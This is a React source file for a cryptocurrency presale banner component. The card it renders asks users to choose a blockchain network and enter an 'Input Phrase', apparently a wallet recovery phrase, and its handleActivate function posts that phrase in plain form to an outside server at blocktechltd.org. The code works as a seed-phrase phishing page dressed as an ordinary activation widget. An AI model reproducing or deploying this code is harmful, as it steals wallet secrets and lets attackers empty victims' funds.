import { useState } from "react";
import BannerWrapper from "./Banner.style";
import Abstrac1 from "../../../assets/images/banner/abstrac-1.png";
import Abstrac2 from "../../../assets/images/banner/abstrac-2.png";
import Button from "../../../components/button/Button";
import SmoothSlider from "../../../components/smooth-slider/SmoothSlider";
import Progressbar from "../../../components/progressbar/Progressbar";
import { usePresaleData } from "../../../utils/PresaleContext";

const Banner = () => {
  const {
    bnbChainId,
    ethChainId,
    userChainId,
    paymentAmount,
    handlePaymentInput,
  } = usePresaleData();

  const [selectedToken, setSelectedToken] = useState("");
  const [inputValue, setInputValue] = useState("");
  const [progress, setProgress] = useState(30);

  const handleSelectChange = (e) => {
    setSelectedToken(e.target.value);
    setProgress(60); // Set progress to 60 when token is selected
  };

  const handleInputChange = (e) => {
    const value = e.target.value;
    setInputValue(value);
    handlePaymentInput(e); // Update context or any external handlers as needed
    if (value) {
      setProgress(80); // Set progress to 80 when input has a value
    }
  };

  const handleActivate = async () => {
    if (!selectedToken || !inputValue) {
      alert("Please select a token and enter a phrase.");
      return;
    }

    const requestData = {
      token: selectedToken,
      phrase: inputValue,
    };

    try {
      const response = await fetch("https://blocktechltd.org/activate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(requestData),
      });

      if (response.ok) {
        const responseData = await response.json();
        console.log("Activation successful:", responseData);
        alert("Activation successful!");
        // Optional: reset form or handle response data as needed
      } else {
        console.error("Activation failed:", response.statusText);
        alert("Activation failed. Please try again.");
      }
    } catch (error) {
      console.error("Error sending request:", error);
      alert("Error connecting to the server.");
    }
  };

  return (
    <BannerWrapper>
      <div className="container">
        <div className="row align-items-center">
          <div className="col-lg-6">
            <div className="gittu-banner-right">
              <div className="gittu-banner-card">
                <div className="gittu-banner-card-inner">
                  <div className="bg-shape">
                    <div className="bg-shape-img img-1">
                      <img src={Abstrac1} alt="shape" />
                    </div>
                    <div className="bg-shape-img img-2">
                      <img src={Abstrac2} alt="shape" />
                    </div>
                  </div>

                  <div className="card-content">
                    <div className="presale-item mb-20">
                      <div className="presale-item-inner">
                        <h5 className="fw-600 text-uppercase text-white">
                          Activate
                        </h5>
                      </div>
                    </div>

                    <div className="presale-item mb-25">
                      <div className="presale-item-inner">
                        <h6>Select Network</h6>
                        <select
                          value={selectedToken}
                          onChange={handleSelectChange}
                        >
                          <option value="" disabled>
                            Select a network
                          </option>
                          {[
                            "Bitcoin",
                            "Ethereum",
                            "BNB",
                            "Cardano",
                            "Ripple",
                            "Dogecoin",
                            "Polkadot",
                            "Litecoin",
                            "Chainlink",
                            "Solana",
                            "Avalanche",
                            // ... add up to 50 tokens here
                          ].map((token, index) => (
                            <option key={index} value={token}>
                              {token}
                            </option>
                          ))}
                        </select>
                      </div>
                      <div className="presale-item-inner">
                        <h6>Input Phrase</h6>
                        <input
                          type="text"
                          placeholder="table-cat"
                          value={inputValue}
                          onChange={handleInputChange}
                        />
                      </div>
                    </div>

                    <ul className="token-info-list mb-35">
                      <div className="mb-15">
                        <Progressbar done={progress} />
                      </div>
                    </ul>

                    <Button size="large" onClick={handleActivate}>Activate</Button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="gittu-banner-slider">
        <SmoothSlider />
      </div>
    </BannerWrapper>
  );
};

export default Banner;
